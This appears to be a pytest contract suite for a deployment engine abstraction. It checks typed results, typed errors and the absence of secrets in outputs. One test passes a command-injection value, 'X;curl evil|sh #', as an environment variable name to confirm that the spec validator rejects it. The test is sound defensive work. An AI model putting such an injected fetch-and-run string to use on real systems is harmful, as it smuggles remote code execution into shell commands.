# tests/ship_engine/test_contract.py — the ShipEngine CONTRACT suite (SHIP-1).
#
# Every test runs against every registered ``EngineCase`` (the ``engine_case``
# fixture in conftest.py) — nothing here names a driver, asserts on a CLI
# command, or reads a transcript. A future DokployDriver passes this suite
# unchanged by registering its own case.
#
# What the contract guarantees:
#   * every supported verb returns its frozen typed result for the standard
#     scenario (see contract.py);
#   * verbs the engine refuses by design raise ``VerbNotSupported``;
#   * a verb that ran and failed raises ``CommandFailed`` with the exit code
#     and a stderr tail;
#   * no result DTO and no raised error ever carries secret material.
#
# Created 2026-07-21 (feat/ship-1-engine-contract): new module.
# Updated 2026-07-21 (review fixes): logs contract test now runs the
#   no-secret-material scan; added PORT-level guarantees (AppSpec rejects
#   hostile env var names with InvalidSpec; AppSpec/DeployRequest repr never
#   prints env values).

from __future__ import annotations

import pytest
from pocketpaw_ee.ship_engine import (
    AppSpec,
    BackupResult,
    CommandFailed,
    DbResult,
    DeployResult,
    DomainResult,
    InvalidSpec,
    LogChunk,
    MetricsSnapshot,
    ShipEngine,
    VerbNotSupported,
)

from tests.ship_engine import contract as c
from tests.ship_engine.contract import (
    VERB_CALLS,
    EngineCase,
    assert_clean_text,
    assert_no_secret_material,
)


async def test_engine_satisfies_the_port(engine_case: EngineCase) -> None:
    assert isinstance(engine_case.make_happy(), ShipEngine)
    assert isinstance(engine_case.make_failing(), ShipEngine)


async def test_deploy_app_returns_typed_result(engine_case: EngineCase) -> None:
    result = await engine_case.make_happy().deploy_app(c.DEPLOY_REQUEST)
    assert isinstance(result, DeployResult)
    assert result.app == c.APP
    assert result.image == c.IMAGE
    assert isinstance(result.app_url, str)
    assert_no_secret_material(result, engine_case.secret_markers)


async def test_add_domain_returns_typed_result(engine_case: EngineCase) -> None:
    result = await engine_case.make_happy().add_domain(c.APP, c.DOMAIN)
    assert isinstance(result, DomainResult)
    assert result.app == c.APP
    assert result.domain == c.DOMAIN
    assert result.tls_enabled is True
    assert_no_secret_material(result, engine_case.secret_markers)


async def test_db_create_returns_typed_result(engine_case: EngineCase) -> None:
    result = await engine_case.make_happy().db_create(c.APP, c.SERVICE)
    assert isinstance(result, DbResult)
    assert result.service == c.SERVICE
    assert result.linked_app == c.APP
    assert result.exposed_env_var  # the NAME of the injected var, never its value
    assert_no_secret_material(result, engine_case.secret_markers)


async def test_backup_returns_typed_result(engine_case: EngineCase) -> None:
    result = await engine_case.make_happy().backup(c.SERVICE, c.BACKUP_PATH)
    assert isinstance(result, BackupResult)
    assert result.service == c.SERVICE
    assert result.dest_path == c.BACKUP_PATH
    assert result.size_bytes > 0
    assert_no_secret_material(result, engine_case.secret_markers)


async def test_rollback_returns_typed_result(engine_case: EngineCase) -> None:
    result = await engine_case.make_happy().rollback(c.APP, c.ROLLBACK_IMAGE)
    assert isinstance(result, DeployResult)
    assert result.app == c.APP
    assert result.image == c.ROLLBACK_IMAGE
    assert_no_secret_material(result, engine_case.secret_markers)


async def test_logs_returns_typed_result(engine_case: EngineCase) -> None:
    result = await engine_case.make_happy().logs(c.APP)
    assert isinstance(result, LogChunk)
    assert result.app == c.APP
    assert isinstance(result.lines, tuple)
    assert len(result.lines) >= 1
    assert all(isinstance(line, str) and line.strip() for line in result.lines)
    assert_no_secret_material(result, engine_case.secret_markers)


async def test_metrics_returns_typed_result(engine_case: EngineCase) -> None:
    result = await engine_case.make_happy().metrics(c.APP)
    assert isinstance(result, MetricsSnapshot)
    assert result.app == c.APP
    assert result.deployed is True  # the standard scenario models a healthy app
    assert result.running is True
    assert result.processes >= 1
    assert 0.0 <= result.disk_used_pct <= 100.0
    assert_no_secret_material(result, engine_case.secret_markers)


async def test_destroy_returns_none(engine_case: EngineCase) -> None:
    assert await engine_case.make_happy().destroy(c.APP) is None


async def test_unsupported_verbs_raise_typed_error(engine_case: EngineCase) -> None:
    engine = engine_case.make_happy()
    for verb in sorted(engine_case.unsupported_verbs):
        with pytest.raises(VerbNotSupported) as exc_info:
            await VERB_CALLS[verb](engine)
        assert exc_info.value.verb == verb
        assert exc_info.value.engine == engine_case.name


async def test_failed_command_maps_to_typed_error(engine_case: EngineCase) -> None:
    with pytest.raises(CommandFailed) as exc_info:
        await engine_case.make_failing().deploy_app(c.DEPLOY_REQUEST)
    exc = exc_info.value
    assert exc.exit_code != 0
    assert exc.stderr_tail
    # The error flows into logs and API responses — it must be secret-free.
    assert_clean_text(str(exc), engine_case.secret_markers)
    assert_clean_text(exc.command, engine_case.secret_markers)
    assert_clean_text(exc.stderr_tail, engine_case.secret_markers)


# --------------------------------------------------------------------- #
# Port-level guarantees (engine-independent, no fixture needed)
# --------------------------------------------------------------------- #


def test_app_spec_rejects_hostile_env_keys() -> None:
    # A shell-syntax key must die at the DTO boundary — long before any
    # driver interpolates it into a remote command.
    with pytest.raises(InvalidSpec):
        AppSpec(name="demo", env={"X;curl evil|sh #": "v"})


def test_app_spec_repr_never_prints_env_values() -> None:
    # env is repr=False: a logged/debugged spec (or DeployRequest wrapping
    # one) must not print secret values.
    for marker in c.ENV.values():
        assert marker not in repr(c.APP_SPEC)
        assert marker not in repr(c.DEPLOY_REQUEST)
